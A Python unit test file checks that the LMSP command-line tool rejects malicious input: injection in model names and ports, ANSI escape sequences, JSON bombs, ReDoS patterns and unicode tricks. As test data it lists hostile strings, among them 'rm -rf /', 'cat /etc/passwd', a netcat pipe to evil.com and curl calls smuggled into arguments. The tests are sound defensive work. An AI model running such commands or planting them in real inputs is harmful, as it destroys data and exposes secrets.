#!/usr/bin/env python3
"""
Security-focused tests for LMSP CLI tool
Tests for malicious input, injection attacks, and DoS protection
"""

import unittest
from unittest.mock import patch, MagicMock
import sys
import os
import json
import time
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from lmsp import cli as lmsp
from lmsp.cli import LMSPSecurityError, LMSPValidationError

class TestSecurity(unittest.TestCase):
    """Security-focused test cases"""

    def test_malicious_model_name_command_injection(self):
        """Test that malicious model names with command injection are rejected"""
        malicious_names = [
            "model; rm -rf /",
            "model && cat /etc/passwd",
            "model | nc evil.com 1337",
            "model`cat /etc/passwd`",
            "model$(cat /etc/passwd)",
            "model\nls -la",
            "model;sleep 10",
            "../../../etc/passwd",
            "model' || rm -rf / --",
        ]
        
        for malicious_name in malicious_names:
            with self.subTest(malicious_name=malicious_name):
                with self.assertRaises(LMSPValidationError):
                    lmsp.validate_model_name(malicious_name)

    def test_ansi_escape_sequences_in_model_output(self):
        """Test that ANSI escape sequences in model output are sanitized"""
        malicious_outputs = [
            "\x1b]0;HACKED\x07",  # Window title injection
            "\x1b[?1049h",         # Terminal manipulation
            "\x1b[2J\x1b[H",       # Clear screen
            "\x1b[31mRED TEXT\x1b[0m",  # Color injection
            "\x1b[1m\x1b[4mBold Underline\x1b[0m",
            "\x1b[999C\x1b[999B",  # Cursor manipulation
            "\x1b[6n",             # Device status report
            "\x1b[s\x1b[u",        # Save/restore cursor
        ]
        
        for malicious_output in malicious_outputs:
            with self.subTest(output=repr(malicious_output)):
                sanitized = lmsp.sanitize_terminal_output(malicious_output)
                # Should not contain ANSI escape sequences
                self.assertNotIn('\x1b', sanitized)
                self.assertNotIn('\033', sanitized)

    def test_json_bomb_protection_large_size(self):
        """Test protection against large JSON responses"""
        # Create a very large JSON string
        large_json = '{"data": "' + 'A' * (11 * 1024 * 1024) + '"}'  # 11MB
        
        with self.assertRaises(LMSPSecurityError) as context:
            lmsp.safe_json_loads(large_json)
        
        self.assertIn("JSON response too large", str(context.exception))

    def test_json_bomb_protection_deep_nesting(self):
        """Test protection against deeply nested JSON objects"""
        # Create deeply nested JSON (30 levels deep)
        nested_json = '{"a":' * 30 + '"value"' + '}' * 30
        
        with self.assertRaises(LMSPSecurityError) as context:
            lmsp.safe_json_loads(nested_json)
        
        self.assertIn("JSON nesting too deep", str(context.exception))

    def test_redos_attack_patterns_in_markdown(self):
        """Test that ReDoS attack patterns in markdown formatting complete quickly"""
        redos_patterns = [
            "*" * 10000 + "text",  # Many asterisks
            "**" + "*" * 5000 + "**",  # Nested asterisks
            "`" * 1000 + "code" + "`" * 1000,  # Many backticks
            "#" * 100 + " header",  # Many hashes
        ]
        
        for pattern in redos_patterns:
            with self.subTest(pattern=pattern[:50] + "..."):
                start_time = time.time()
                result = lmsp.format_markdown(pattern)
                end_time = time.time()
                
                # Should complete within 1 second
                self.assertLess(end_time - start_time, 1.0, 
                               f"Markdown formatting took too long: {end_time - start_time:.2f}s")
                # Should not crash
                self.assertIsInstance(result, str)

    @patch('subprocess.run')
    def test_malicious_lms_binary_response_json(self, mock_run):
        """Test that malicious responses from lms binary are handled safely"""
        malicious_responses = [
            '{"identifier": "model; rm -rf /"}',  # Command injection in JSON
            '{"identifier": "\x1b]0;HACKED\x07"}',  # ANSI escape in JSON
            '{"identifier": "' + 'A' * 1000 + '"}',  # Very long model name
            '{"name": "../../../etc/passwd"}',  # Path traversal
        ]
        
        for malicious_response in malicious_responses:
            with self.subTest(response=malicious_response[:50] + "..."):
                mock_run.return_value = MagicMock(
                    returncode=0,
                    stdout=malicious_response
                )
                
                # Should either return empty list or raise validation error
                try:
                    models = lmsp.get_loaded_models()
                    # If it returns models, they should be validated
                    for model in models:
                        if isinstance(model, dict):
                            identifier = model.get("identifier", "")
                            if identifier:
                                # Should pass validation (malicious names filtered out)
                                self.assertRegex(identifier, r'^[A-Za-z0-9._\-/]+$')
                except (LMSPValidationError, LMSPSecurityError, json.JSONDecodeError):
                    # Expected for malicious input
                    pass

    @patch('subprocess.run')
    def test_malicious_lms_binary_response_plaintext(self, mock_run):
        """Test that malicious plaintext responses from lms binary are handled safely"""
        # First call (JSON) fails, second call (plaintext) returns malicious data
        mock_run.side_effect = [
            MagicMock(returncode=1, stdout=''),  # JSON fails
            MagicMock(returncode=0, stdout='Model ID\nmodel; rm -rf /\n')  # Malicious plaintext
        ]
        
        models = lmsp.get_loaded_models()
        # Should return empty list (malicious model name filtered out)
        self.assertEqual(len(models), 0)

    def test_port_injection_attempts(self):
        """Test that port injection attempts are blocked"""
        malicious_ports = [
            "1234; curl evil.com",
            "1234`curl evil.com`",
            "1234$(curl evil.com)",
            "1234 && rm -rf /",
            80,  # Privileged port
            0,   # Invalid port
            99999,  # Port too high
            -1,  # Negative port
        ]
        
        for malicious_port in malicious_ports:
            with self.subTest(port=malicious_port):
                if isinstance(malicious_port, str):
                    # String ports should fail type conversion in argparse
                    continue
                else:
                    with self.assertRaises(LMSPValidationError):
                        lmsp.validate_port(malicious_port)

    def test_extremely_long_model_names(self):
        """Test handling of extremely long model names"""
        long_names = [
            "A" * 101,  # Just over limit
            "A" * 1000,  # Very long
            "A" * 10000,  # Extremely long
        ]
        
        for long_name in long_names:
            with self.subTest(length=len(long_name)):
                with self.assertRaises(LMSPValidationError):
                    lmsp.validate_model_name(long_name)

    def test_null_byte_injection(self):
        """Test that null bytes in input are handled safely"""
        null_byte_inputs = [
            "model\x00",
            "model\x00; rm -rf /",
            "\x00model",
            "mod\x00el",
        ]
        
        for null_input in null_byte_inputs:
            with self.subTest(input=repr(null_input)):
                with self.assertRaises(LMSPValidationError):
                    lmsp.validate_model_name(null_input)

    def test_unicode_normalization_attacks(self):
        """Test handling of Unicode normalization attacks"""
        unicode_attacks = [
            "model\u202e",  # Right-to-left override
            "model\u200b",  # Zero-width space
            "model\ufeff",  # Byte order mark
            "model\u2000",  # En quad
            "model\u00a0",  # Non-breaking space
        ]
        
        for unicode_attack in unicode_attacks:
            with self.subTest(input=repr(unicode_attack)):
                with self.assertRaises(LMSPValidationError):
                    lmsp.validate_model_name(unicode_attack)

    def test_binary_data_in_json_responses(self):
        """Test handling of binary data in JSON responses"""
        binary_jsons = [
            '{"identifier": "\x00\x01\x02"}',  # Binary data
            '{"identifier": "\xff\xfe"}',      # Invalid UTF-8
            '{"identifier": "\x80\x81"}',      # More invalid UTF-8
        ]
        
        for binary_json in binary_jsons:
            with self.subTest(json=repr(binary_json)):
                try:
                    # Should either fail JSON parsing or validation
                    result = lmsp.safe_json_loads(binary_json)
                    if 'identifier' in result:
                        with self.assertRaises(LMSPValidationError):
                            lmsp.validate_model_name(result['identifier'])
                except (json.JSONDecodeError, UnicodeDecodeError, LMSPSecurityError):
                    # Expected for malformed JSON
                    pass

    @patch('lmsp.get_loaded_models')
    @patch('requests.post')
    def test_malicious_streaming_response(self, mock_post, mock_get_models):
        """Test that malicious content in streaming responses is sanitized"""
        mock_get_models.return_value = [{"identifier": "test-model"}]
        
        # Mock streaming response with ANSI escape sequences
        mock_response = MagicMock()
        mock_response.status_code = 200
        mock_response.encoding = 'utf-8'
        mock_response.iter_lines.return_value = [
            'data: {"choices":[{"delta":{"content":"\\x1b]0;HACKED\\x07"}}]}',
            'data: {"choices":[{"delta":{"content":"Normal text"}}]}',
            'data: [DONE]'
        ]
        mock_post.return_value = mock_response
        
        # Capture printed output
        with patch('builtins.print') as mock_print:
            response, _ = lmsp.send_prompt("test", stream=True)
            
            # Check that ANSI escapes were stripped from printed output
            printed_calls = [str(call) for call in mock_print.call_args_list]
            for call in printed_calls:
                self.assertNotIn('\x1b', call)
                self.assertNotIn('\033', call)

    def test_concurrent_request_protection(self):
        """Test that resource limits are enforced under load"""
        # This would need more complex setup for real concurrency testing
        # For now, test that limits are enforced
        
        # Test maximum output tokens
        large_content = "A" * (lmsp.MAX_OUTPUT_TOKENS + 1000)
        
        # Test that content would be truncated (this is a simplified test)
        # In real implementation, token counting happens during streaming
        self.assertGreater(len(large_content), lmsp.MAX_OUTPUT_TOKENS)

    def test_empty_and_none_inputs(self):
        """Test handling of empty and None inputs"""
        with self.assertRaises(LMSPValidationError):
            lmsp.validate_model_name("")
        
        with self.assertRaises(LMSPValidationError):
            lmsp.validate_prompt("")
        
        # None inputs should raise LMSPValidationError 
        with self.assertRaises(LMSPValidationError):
            lmsp.validate_model_name(None)

    def test_validation_bypass_attempts(self):
        """Test attempts to bypass validation"""
        bypass_attempts = [
            "model\r",      # Carriage return
            "model\n",      # Newline
            "model\t",      # Tab
            "model ",       # Trailing space
            " model",       # Leading space
            "model\v",      # Vertical tab
            "model\f",      # Form feed
        ]
        
        for bypass_attempt in bypass_attempts:
            with self.subTest(attempt=repr(bypass_attempt)):
                with self.assertRaises(LMSPValidationError):
                    lmsp.validate_model_name(bypass_attempt)

    def test_safe_json_loads_edge_cases(self):
        """Test edge cases in safe JSON loading"""
        edge_cases = [
            '[]',  # Empty array
            '{}',  # Empty object
            'null',  # Null value
            '""',   # Empty string
            '0',    # Zero
            'true', # Boolean
        ]
        
        for case in edge_cases:
            with self.subTest(json=case):
                result = lmsp.safe_json_loads(case)
                # Should parse successfully (null is a valid JSON value)
                if case == 'null':
                    self.assertIsNone(result)
                else:
                    self.assertIsNotNone(result)

    def test_markdown_format_size_limits(self):
        """Test that markdown formatting has size limits"""
        huge_text = "A" * 100000  # 100KB
        
        formatted = lmsp.format_markdown(huge_text)
        
        # Should be truncated
        self.assertLess(len(formatted), len(huge_text))
        self.assertIn("truncated", formatted)

    def test_double_encoded_attacks(self):
        """Test handling of double-encoded attack patterns"""
        double_encoded_attacks = [
            "%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",  # ../../../etc/passwd
            "%3b%72%6d%20%2d%72%66%20%2f",  # ; rm -rf /
            "%24%28%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%29",  # $(cat /etc/passwd)
        ]
        
        for attack in double_encoded_attacks:
            with self.subTest(attack=attack):
                with self.assertRaises(LMSPValidationError):
                    lmsp.validate_model_name(attack)

    def test_input_length_edge_cases(self):
        """Test edge cases around input length limits"""
        # Test exactly at the boundary
        boundary_name = "A" * 100  # Exactly 100 characters
        
        # Should pass
        validated = lmsp.validate_model_name(boundary_name)
        self.assertEqual(validated, boundary_name)
        
        # Test one over the boundary  
        over_boundary = "A" * 101
        with self.assertRaises(LMSPValidationError):
            lmsp.validate_model_name(over_boundary)
        
        # Test empty string
        with self.assertRaises(LMSPValidationError):
            lmsp.validate_model_name("")


if __name__ == '__main__':
    unittest.main()